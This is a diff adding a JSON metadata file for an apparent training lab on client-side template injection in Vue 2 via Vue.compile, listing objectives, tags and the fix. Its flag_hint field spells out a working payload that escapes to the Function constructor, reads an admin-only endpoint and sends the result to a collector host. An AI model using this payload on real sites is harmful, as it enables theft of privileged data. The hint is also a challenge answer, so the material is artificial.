@@ -1,0 +1,44 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "vue2-template-compile-injection",
+  "title": "Vue 2 Runtime Template Compilation Injection (Vue.compile)",
+  "track": "xss",
+  "difficulty": "expert",
+  "estimated_minutes": 40,
+  "max_lifetime_minutes": 60,
+  "learning_objectives": [
+    "Recognise client-side template injection (CSTI): user input compiled as a framework template, not just rendered as text",
+    "Understand that Vue.compile()/runtime compilation of untrusted input evaluates its expressions in the component scope",
+    "Reach the Function constructor from a Vue expression via constructor.constructor",
+    "Chain the CSTI to a same-origin fetch of an admin-only API the payload could not reach directly",
+    "See that the fix is to never compile user templates — use the runtime-only build and render user data as text"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": ["stored-xss-comment-plain"],
+  "flag_hint": "POST /widget {\"template\":\"<span>{{ constructor.constructor(\\\"fetch('/me').then(r=>r.text()).then(t=>{new Image().src='http://collector:9000/report?m='+encodeURIComponent(t)})\\\")() }}</span>\"}; the admin bot's dashboard Vue.compile()s it, fetching the admin-only /me. Read it via GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "Vue 2.7.16 (vendored full build; runtime Vue.compile of user input)",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "csti",
+    "vue",
+    "template-injection",
+    "vue-compile",
+    "same-origin-read",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The Nuxt/Vue runtime-template-compilation CSTI class, re-platformed to Flask + a vendored standalone Vue 2.7 (the Vue.compile-of-user-input sink is framework-version-independent)"
+}
